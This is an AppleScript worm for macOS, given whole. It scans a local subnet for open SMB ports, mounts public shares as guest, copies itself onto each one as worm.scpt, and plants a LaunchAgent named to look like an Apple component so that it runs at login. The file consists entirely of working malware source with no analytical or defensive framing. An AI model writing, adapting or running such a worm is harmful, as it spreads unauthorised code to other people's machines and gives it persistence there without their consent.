-- Get self path
set selfPath to POSIX path of (path to me)

-- IP scanning (local subnet)
set subnet to "192.168.1"
repeat with i from 2 to 254
	set targetIP to subnet & "." & (i as string)
	
	-- Check if port 445 (SMB) or 548 (AFP) is open
	try
		set smbCheck to do shell script "nc -z -G 2 " & targetIP & " 445 && echo open"
	on error
		set smbCheck to ""
	end try
	
	if smbCheck is "open" then
		try
			-- Attempt to mount public SMB share (no auth)
			set mountPoint to "/Volumes/share_" & (i as string)
			do shell script "mkdir -p " & quoted form of mountPoint
			do shell script "mount_smbfs //guest:@" & targetIP & "/Public " & quoted form of mountPoint
			
			-- Copy worm to shared folder or login folder
			do shell script "cp " & quoted form of selfPath & " " & quoted form of (mountPoint & "/worm.scpt")
			
			-- Try to add to LaunchAgents on remote if writable (hypothetical)
			do shell script "mkdir -p " & quoted form of (mountPoint & "/Users/Shared/Library/LaunchAgents")
			set plistPath to mountPoint & "/Users/Shared/Library/LaunchAgents/com.apple.networm.plist"
			set plistContent to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.networm</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>/Users/Shared/worm.scpt</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"
			do shell script "echo " & quoted form of plistContent & " > " & quoted form of plistPath
		end try
	end if
end repeat
